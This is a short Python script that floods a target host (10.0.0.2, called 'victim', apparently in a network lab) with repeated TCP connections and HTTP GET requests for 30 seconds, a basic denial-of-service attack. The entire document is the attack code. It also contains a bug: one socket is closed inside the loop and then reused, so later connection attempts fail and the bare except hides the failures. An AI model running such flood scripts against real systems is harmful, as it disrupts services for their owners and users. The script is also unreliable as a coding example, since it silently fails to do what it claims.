import socket
import time

TARGET_IP = '10.0.0.2'   # victim IP eg.h2
TARGET_PORT = 80         # target port
DURATION = 30            # attack duration in seconds
INTERVAL = 0.01          # Interval between packets (seconds)

end_time = time.time() + DURATION
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(1)

while time.time() < end_time:
    try:
        sock.connect((TARGET_IP, TARGET_PORT))
        sock.send(b'GET / HTTP/1.1\r\nHost: %s\r\n\r\n' % TARGET_IP.encode())
        sock.close()
    except Exception as e:
        pass  # Ignore errors (target may refuse connections)
    time.sleep(INTERVAL)
